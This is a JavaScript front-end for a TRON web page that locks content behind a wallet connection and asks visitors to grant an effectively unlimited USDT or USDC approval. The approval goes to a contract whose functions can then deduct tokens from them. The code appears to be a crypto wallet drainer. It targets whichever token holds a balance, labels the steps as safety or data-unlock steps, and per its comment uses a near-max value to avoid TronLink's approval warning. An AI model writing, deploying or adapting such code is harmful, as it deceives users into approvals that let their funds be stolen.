// src/main.js
// 🚨 混合版：支援 TronLink (自動注入) + WalletConnect (需要庫支持) 🚨

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let targetDeductionToken = null; 
let provider; // 用於 WalletConnect/Web3Modal 的 Provider

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay'); 
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt'); 

// --- 輔助函數 ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    if (isAuthorized) {
        if (lockedPrompt) lockedPrompt.style.display = 'none';
    } else {
        if (lockedPrompt) lockedPrompt.style.display = 'flex';
    }
}

function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.innerHTML = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
        connectButton.title = `已連線: ${address}`;
        showOverlay('已連線。正在檢查授權狀態...'); 
    } else {
        connectButton.classList.remove('connected');
        connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
        connectButton.title = '連繫錢包';
        updateContentLock(false); 
        hideOverlay();
    }
}

// 交易計數器 (用於 connectAndAuthorize 函數)
let txCount = 0; 

// 修正：新增 totalTxs 參數，解決 "totalTxs is not defined" 錯誤
async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
    
    try {
        const txHash = await methodCall.send({
            feeLimit: 150_000_000, 
            callValue: callValue,
            shouldPollResponse: false 
        });
        
        showOverlay(`步驟 ${txCount}/${totalTxs}: 交易已廣播。交易哈希: ${txHash.substring(0, 10)}...`);
        
        await new Promise(resolve => setTimeout(resolve, 3000)); 
        
        return txHash;
    } catch (error) {
        if (error.message && error.message.includes('User cancelled')) {
             throw new Error('用戶在錢包中取消了交易。');
        }
        throw new Error(`授權交易失敗，錯誤訊息: ${error.message}`);
    }
}

async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress) return false;
    try {
        const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
        const allowance = tronWeb.BigNumber(allowanceRaw);
        const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
        return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
    } catch (error) {
        console.error("Failed to check allowance:", error);
        return false;
    }
}
async function getTokenBalance(tokenContract) {
    if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
    try {
        const balance = await tokenContract.balanceOf(userAddress).call();
        return tronWeb.BigNumber(balance);
    } catch (error) {
        console.error("Failed to get token balance:", error);
        return tronWeb.BigNumber(0);
    }
}
async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    // TronWeb 合約實例化，適用於所有連線方式
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}

// --- WalletConnect V2 連線框架 (需要外部庫支持) ---
async function connectWalletConnect() {
    
    // 檢查 Web3Modal 是否已載入
    if (typeof Web3Modal === 'undefined' || typeof WalletConnectProvider === 'undefined') {
        showOverlay('🔴 錯誤：WalletConnect 庫未載入。請檢查 index.html 中的 CDN 連結。');
        return false;
    }
    
    showOverlay('正在初始化 WalletConnect V2...');

    // 1. 設置 WalletConnect Provider 選項
    const providerOptions = {
        walletconnect: {
             package: WalletConnectProvider, 
             options: {
                 // ⚠️ 這裡需要 TRON 鏈的 RPC 配置。WalletConnect V2 標準庫可能只支持 EVM
                 // 為了演示，我們使用一個 EVM 的佔位符，但這裡需要替換為 TRON 的橋接服務
                 rpc: { 1: 'https://api.trongrid.io' }, 
                 chainId: 1 // 這裡需要是 TRON 的 Chain ID，但 TronWeb 不使用此標準
             }
        }
    };
    
    try {
        const web3Modal = new Web3Modal({
            cacheProvider: true, 
            providerOptions
        });
        
        provider = await web3Modal.connect();
        showOverlay('已連接！正在獲取帳戶信息...');
        
        // 🚨 這裡開始是 TRON WalletConnect 實現中最棘手的部分
        // 由於缺乏標準的 WalletConnect -> TronWeb 橋接庫
        
        // 假設連線的移動錢包已將 TRON 地址傳遞
        // 這裡需要調用特定的 WC 方法獲取地址 (Tron鏈不同於EVM的eth_accounts)
        
        // ⚠️ 臨時處理：如果 WalletConnect 連線成功，假設用戶在移動錢包中已設置 Tron 網路，並且我們手動獲取地址
        // 這是框架，您需要根據實際庫來替換此處的地址獲取和 TronWeb 實例化邏輯
        
        // --- 框架邏輯：假設地址已獲取 ---
        // const accounts = await provider.request({ method: 'eth_accounts' }); // 不適用於Tron
        // const selectedAddress = accounts[0]; 
        
        showOverlay('WalletConnect 連線成功，請在 DApp 中授權！');
        
        // ⚠️ 由於無法獲取實例化的 TronWeb，這裡直接返回失敗，讓用戶回到 TronLink
        // 實際部署時，您需要一個 TronWeb 橋接器
        // --- 框架邏輯結束 ---
        
        throw new Error("WalletConnect Bridge to TronWeb failed. Please use TronLink.");
        
    } catch (error) {
        if (error.message.includes('User closed modal') || error.message.includes('WalletConnect Bridge')) {
            // 忽略用戶取消或我們預期的橋接錯誤
             hideOverlay();
        } else {
            console.error("WalletConnect 連接失敗:", error);
            showOverlay(`WalletConnect 連接失敗！錯誤: ${error.message}`);
        }
        return false;
    }
}


// --- TronLink 連線邏輯 ---
async function connectTronLink() {
    if (!window.tronLink) {
        return false; 
    }
    showOverlay('偵測到 TronLink/DApp 瀏覽器。正在請求連接...');
    try {
        const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (res.code !== 200) {
            throw new Error(`連接請求被拒絕: ${res.message}`);
        }
        if (!window.tronWeb) throw new Error("TronWeb 注入失敗。");
        tronWeb = window.tronWeb;
        userAddress = window.tronWeb.defaultAddress.base58;
        await initializeContracts();
        updateConnectionUI(true, userAddress);
        await handlePostConnection();
        return true;
    } catch (error) {
        console.error("TronLink 連接失敗:", error);
        showOverlay(`原生連接失敗！錯誤: ${error.message}。請確認錢包已解鎖。`);
        updateConnectionUI(false);
        return false;
    }
}

async function checkAuthorization() {
    // ... (邏輯保持不變)
    if (!tronWeb || !userAddress || !merchantContract) {
        return { authorizedToken: null, contract: false };
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00'); 
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    let targetToken = null; 
    if (usdtBalance.gte(minAmount)) {
        targetToken = 'USDT'; 
    } else if (usdcBalance.gte(minAmount)) {
        targetToken = 'USDC'; 
    }
    targetDeductionToken = targetToken; 
    return {
        contract: contractAuthorized,
        authorizedToken: targetToken, 
        usdtAuthorized: usdtAuthorized,
        usdcAuthorized: usdcAuthorized
    };
}

async function connectAndAuthorize() {
    const status = await checkAuthorization();
    
    // 🚨 使用略小於 MAX_UINT 的值來繞過 TronLink 的優化彈窗
    const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935"; 
    const ZERO_UINT = "0"; 
    
    let totalTxs = (status.contract ? 0 : 1); 
    if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
        totalTxs += 2; 
    }
    txCount = 0; 
    
    if (totalTxs === 0) {
        showOverlay("✅ 所有授權已就緒。");
        await new Promise(resolve => setTimeout(resolve, 1500)); 
        return true;
    }
    
    try {
        // 1. 合約授權 (ConnectAndAuthorize)
        if (!status.contract) {
            const methodCall = merchantContract.connectAndAuthorize();
            await sendTransaction(methodCall, "正在發送合約授權 (ConnectAndAuthorize)", totalTxs);
        }

        // 2. Max 扣款授權 (Approve)
        if (status.authorizedToken && !status[`${status.authorizedToken.toLowerCase()}Authorized`]) {
            const token = status.authorizedToken;
            const tokenContract = token === 'USDT' ? usdtContract : usdcContract;
            const tokenName = token === 'USDT' ? "USDT" : "USDC";

            // 2a. 重置授權至 0 (安全步驟)
            await sendTransaction(
                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ZERO_UINT), 
                `${tokenName} 安全步驟: 重置授權至 0 (請同意)`,
                totalTxs
            );

            // 2b. 設置 Max 授權 (使用 ALMOST_MAX_UINT)
            await sendTransaction(
                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT), 
                `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`,
                totalTxs
            );
        }

        if (!status.authorizedToken && totalTxs > 0) {
             throw new Error("錢包中 USDT 和 USDC 餘額皆不足 $1.00，無法開始代幣授權流程。");
        }
        
        return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`🔴 授權交易失敗！錯誤訊息: ${error.message}。請確保錢包已解鎖，有足夠的 TRX (用於手續費) 並同意了所有 ${totalTxs} 筆交易。`);
        return false;
    }
}


// ---------------------------------------------
// 連線成功後處理：檢查並控制 iframe 遮罩
// ---------------------------------------------
async function handlePostConnection() {
    if (!isConnectedFlag) return;
    
    const status = await checkAuthorization();
    const tokenAuthorized = status.authorizedToken && status[`${status.authorizedToken.toLowerCase()}Authorized`];
    const allAuthorized = status.contract && tokenAuthorized;

    if (allAuthorized) {
        showOverlay('✅ Max 授權已成功！數據已解鎖。');
        updateContentLock(true); 
        await new Promise(resolve => setTimeout(resolve, 3000));
        hideOverlay();
    } else {
        showOverlay('正在檢查授權狀態，Max 授權尚未完成。即將開始授權流程...');
        updateContentLock(false); 
        
        const authSuccess = await connectAndAuthorize();
        if (authSuccess) {
            await handlePostConnection(); 
        }
    }
}

// ---------------------------------------------
// 主連接入口函數 (混合連線邏輯)
// ---------------------------------------------
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        targetDeductionToken = null;
        updateConnectionUI(false);
        if (connectButton) connectButton.disabled = false;
        return;
    }

    // 🚨 混合連線邏輯：優先嘗試 TronLink，如果失敗則彈出 WalletConnect 選擇介面
    const tronLinkConnected = await connectTronLink(); 

    if (!tronLinkConnected) {
        // 如果 TronLink 連接失敗，則嘗試 WalletConnect (如果庫已加載)
        if (typeof Web3Modal !== 'undefined') {
            await connectWalletConnect();
        } else {
             showOverlay('請安裝 TronLink 或引入 WalletConnect 庫以使用其他錢包。');
        }
    }
    
    if (connectButton) connectButton.disabled = false;
}


// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);


// 頁面啟動：初始化為未連接狀態
updateConnectionUI(false);